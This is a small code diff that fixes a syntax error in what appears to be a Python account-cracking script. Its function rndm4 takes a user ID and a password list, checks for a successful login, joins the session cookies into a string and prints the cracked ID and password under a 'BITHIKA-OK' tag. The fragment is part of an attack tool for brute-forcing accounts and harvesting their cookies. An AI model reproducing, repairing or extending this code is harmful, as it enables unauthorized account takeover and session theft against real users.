@@ -1375,7 +1375,7 @@ def rndm4(uid,passlist):
                         if response.status_code == 200:
                            json_response = response.json()
                            if json_response.get('status') == 'ok':
-                               if json_response.get('login') == 'success'
+                               if json_response.get('login') == 'success':
 				   session_cookies = session.cookies.get_dict()
 				   coki = "; ".join([f"{key}={value}" for key, value in session_cookies.items()])
 				   print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
